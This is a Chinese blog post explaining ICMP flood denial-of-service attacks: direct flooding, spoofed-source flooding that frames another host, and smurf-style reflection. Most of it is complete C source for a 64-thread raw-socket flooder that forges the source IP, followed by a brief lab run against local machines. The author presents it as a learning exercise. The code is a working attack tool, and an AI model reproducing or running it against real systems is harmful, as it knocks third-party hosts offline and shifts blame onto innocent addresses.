---
title: ICMP洪水攻击
date: 2017-02-14 18:33:27
categories: 技术
tags: 网络协议
---
ICMP协议实现了PING的程序，ICMP除了实现这么一个PING程序，还有哪些不为人知或者好玩的用途？这里我将介绍ICMP另一个很有名的黑科技：ICMP洪水攻击。
 
ICMP洪水攻击属于大名鼎鼎的DOS（Denial of Service）攻击的一种，一种是黑客们喜欢的攻击手段，这里本着加深自己对ICMP的理解的目的，也试着基于ICMP写一段ICMP的洪水攻击小程序。
 
洪水攻击（FLOOD ATTACK）指的是利用计算机网络技术向目的主机发送大量无用数据报文，使得目的主机忙于处理无用的数据报文而无法提供正常服务的网络行为。
ICMP洪水攻击：顾名思义，就是对目的主机发送洪水般的ping包，使得目的主机忙于处理ping包而无能力处理其他正常请求，这就好像是洪水一般的ping包把目的主机给淹没了。
 
要实现ICMP的洪水攻击，需要以下三项的知识储备：
1. DOS攻击原理
2. ICMP的深入理解
3. 原始套接字的编程技巧

## 一、ICMP洪水攻击原理
ICMP洪水攻击是在ping的基础上形成的，但是ping程序很少能造成目的及宕机的问题，这是因为ping的发送包的速率太慢了，像我实现的PING程序里ping包发送速率限定在1秒1发，这个速率目的主机处理ping包还是绰绰有余的。所以要造成“洪水”的现象，就必须提升发包速率。这里介绍三种ICMP洪水攻击的方式：
 
（1）直接洪水攻击
这样做需要本地主机的带宽和目的主机的带宽之间进行比拼，比如我的主机网络带宽是30M的，而你的主机网络带宽仅为3M，那我发起洪水攻击淹没你的主机成功率就很大了。这种攻击方式要求攻击主机处理能力和带宽要大于被攻击主机，否则自身被DoS了。基于这种思想，我们可以使用一台高带宽高性能的电脑，采用多线程的方法一次性发送多个ICMP请求报文，让目的主机忙于处理大量这些报文而造成速度缓慢甚至宕机。这个方法有个大缺点，就是对方可以根据ICMP包的IP地址而屏蔽掉攻击源，使得攻击不能继续。
 
（2）伪IP攻击
在直接洪水攻击的基础上，我们将发送方的IP地址伪装成其他IP，如果是伪装成一个随机的IP，那就可以很好地隐藏自己的位置；如果将自己的IP伪装成其他受害者的IP，就会造成“挑拨离间”的情形，受害主机1的icmp回复包也如洪水般发送给受害主机2，如果主机1的管理员要查是哪个混蛋发包攻击自己，他一查ICMP包的源地址，咦原来是主机2，这样子主机2就成了戴罪羔羊了。
 
（3）反射攻击
这类攻击的思想不同于上面两种攻击，反射攻击的设计更为巧妙。其实这里的方式三的攻击模式是前两个模式的合并版以及升级版，方式三的攻击策略有点像“借刀杀人“，反射攻击不再直接对目标主机，而是让其他一群主机误以为目标主机在向他们发送ICMP请求包，然后一群主机向目的主机发送ICMP应答包，造成来自四面八方的洪水淹没目的主机的现象。比如我们向局域网的其他主机发送ICMP请求包，然后自己的IP地址伪装成目的主机的IP，这样子目的主机就成了ICMP回显的焦点了。这种攻击非常隐蔽，因为受害主机很难查出攻击源是谁。
 
![](1093303-20170213235415910-2043263573.png)
 
## 二、ICMP洪水攻击程序设计
这里我想实现一个ICMP洪水攻击的例子，这里我想采用方式二来进行设计。虽说方式三的“借刀杀人”更为巧妙，其实也是由方式二的伪装方式进一步延伸的，实现起来也是大同小异。
 
首先给出攻击的模型图：

![](1093303-20170213235841910-1275984405.png)

 
### 1.组ICMP包
这里的组包跟编写PING程序时的组包没太大差别，唯一需要注意的是，我们需要填写IP头部分，因为我们要伪装源地址，做到嫁祸于人。
```
void DoS_icmp_pack(char* packet)
{
    struct ip* ip_hdr = (struct ip*)packet;
    struct icmp* icmp_hdr = (struct icmp*)(packet + sizeof(struct ip));

    ip_hdr->ip_v = 4;
    ip_hdr->ip_hl = 5;
    ip_hdr->ip_tos = 0;
    ip_hdr->ip_len = htons(ICMP_PACKET_SIZE);
    ip_hdr->ip_id = htons(getpid());
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 64;
    ip_hdr->ip_p = PROTO_ICMP;
    ip_hdr->ip_sum = 0;
    ip_hdr->ip_src.s_addr = inet_addr(FAKE_IP);; //伪装源地址
    ip_hdr->ip_dst.s_addr = dest;  //填入要攻击的目的主机地址

    icmp_hdr->icmp_type = ICMP_ECHO;
    icmp_hdr->icmp_code = 0;
    icmp_hdr->icmp_cksum = htons(~(ICMP_ECHO << 8));//注意这里，因为数据部分为0，我们就简化了一下checksum的计算了
}
```
 

### 2.搭建发包线程

```
void Dos_Attack()
{
    char* packet = (char*)malloc(ICMP_PACKET_SIZE);
    memset(packet, 0, ICMP_PACKET_SIZE);
    struct sockaddr_in to;
    DoS_icmp_pack(packet);

    to.sin_family = AF_INET;
    to.sin_addr.s_addr = dest;
    to.sin_port = htons(0);

    while(alive)  //控制发包的全局变量
    {
        sendto(rawsock, packet, ICMP_PACKET_SIZE, 0, (struct sockaddr*)&to, sizeof(struct sockaddr));        
    }

    free(packet);  //记得要释放内存
}
```

### 3.编写发包开关
这里的开关很简单，用信号量+全局变量即可以实现。当我们按下ctrl+c时，攻击将关闭。
```
void Dos_Sig()
{
    alive = 0;
    printf("stop DoS Attack!\n");
}
```

### 4.总的架构
我们使用了64个线程一起发包，当然这个线程数还可以大大增加，来增加攻击强度。但我们只是做做实验，没必要搞那么大。
```
int main(int argc, char* argv[])
{
    struct hostent* host = NULL;
    struct protoent* protocol = NULL;
    int i;
    alive = 1;
    pthread_t attack_thread[THREAD_MAX_NUM];  //开64个线程同时发包    
    int err = 0;

    if(argc < 2)
    {
        printf("Invalid input!\n");
        return -1;
    }

    signal(SIGINT, Dos_Sig);

    protocol = getprotobyname(PROTO_NAME);
    if(protocol == NULL)
    {
        printf("Fail to getprotobyname!\n");
        return -1;
    }

    PROTO_ICMP = protocol->p_proto;

    dest = inet_addr(argv[1]);

    if(dest == INADDR_NONE)
    {
        host = gethostbyname(argv[1]);
        if(host == NULL)
        {
            printf("Invalid IP or Domain name!\n");
            return -1;
        }
        memcpy((char*)&dest, host->h_addr, host->h_length);

    }

    rawsock = socket(AF_INET, SOCK_RAW, PROTO_ICMP);
    if(rawsock < 0)
    {
        printf("Fait to create socket!\n");
        return -1;
    }

    setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", sizeof("1"));

    printf("ICMP FLOOD ATTACK START\n");

    for(i=0;i<THREAD_MAX_NUM;i++)
    {
        err = pthread_create(&(attack_thread[i]), NULL, (void*)Dos_Attack, NULL);
        if(err)
        {
            printf("Fail to create thread, err %d, thread id : %d\n",err, attack_thread[i]);            
        }
    }

    for(i=0;i<THREAD_MAX_NUM;i++)
    {
        pthread_join(attack_thread[i], NULL);   //等待线程结束
    }

    printf("ICMP ATTACK FINISHI!\n");

    close(rawsock);

    return 0;
}
 

 ```

## 三、实验
本次实验本着学习的目的，想利用自己手上的设备，想进一步理解网络和协议的应用，所以攻击的幅度比较小，时间也就几秒，不对任何设备造成影响。
 
再说一下我们的攻击步骤：我们使用主机172.0.5.183作为自己的攻击主机，并将自己伪装成主机172.0.5.182，对主机172.0.5.9发起ICMP洪水攻击。
 
攻击开始

![](1093303-20170214000442425-1603699988.png)

 
我们观察一下”受害者“那边的情况。在短短5秒里，正确收到并交付上层处理的包也高达7万多个了。我也不敢多搞事，避免影响机器工作。

![](1093303-20170214000518847-108927127.png)

 
使用wireshark抓包再瞧一瞧，满满的ICMP包啊，看来量也是很大的。ICMP包的源地址显示为172.0.5.182（我们伪装的地址），它也把echo reply回给了172.0.5.182。主机172.0.5.182肯定会想，莫名其妙啊，怎么收到这么多echo reply包。

![](1093303-20170214000552175-594982086.png)

 
攻击实验做完了。
 
 
现在更为流行的是DDOS攻击，其威力更为强悍，策略更为精巧，防御难度也更加高。
其实，这种DDoS攻击也是在DOS的基础上发起的，具体步骤如下：
 
1. 攻击者向“放大网络”广播echo request报文
2. 攻击者指定广播报文的源IP为被攻击主机
3. “放大网络”回复echo reply给被攻击主机
4. 形成DDoS攻击场景
 
这里的“放大网络”可以理解为具有很多主机的网络，这些主机的操作系统需要支持对目的地址为广播地址的某种ICMP请求数据包进行响应。
 
攻击策略很精妙，简而言之，就是将源地址伪装成攻击主机的IP，然后发广播的给所有主机，主机们收到该echo request后集体向攻击主机回包，造成群起而攻之的情景。
 